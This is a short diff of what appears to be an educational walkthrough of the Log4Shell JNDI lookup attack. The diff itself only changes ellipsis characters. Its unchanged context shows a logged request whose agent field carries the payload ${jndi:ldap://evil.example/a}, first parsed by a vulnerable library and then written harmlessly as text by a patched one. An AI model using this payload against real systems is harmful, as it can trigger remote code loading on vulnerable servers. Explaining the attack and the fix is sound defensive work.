@@ -70,7 +70,7 @@ the next steps explain.
 ### `write` Writing to the log
 
 `server → log` · `attack` · `without-defence`
-Message: entry: ${jndi:…} · Result: the library parses the string
+Message: entry: ${jndi:...} · Result: the library parses the string
 
 ```text
 INFO search q=socks agent=⟦${jndi:ldap://evil.example/a}⟧
@@ -167,7 +167,7 @@ application exposed to the internet.
 ### `patched` An updated library
 
 `server → log` · `attack` · `with-defence` · `stopped`
-Message: entry: ${jndi:…} · Result: written as text, the attack failed
+Message: entry: ${jndi:...} · Result: written as text, the attack failed
 
 ```text
 INFO search q=socks agent=⟦${jndi:ldap://evil.example/a}⟧
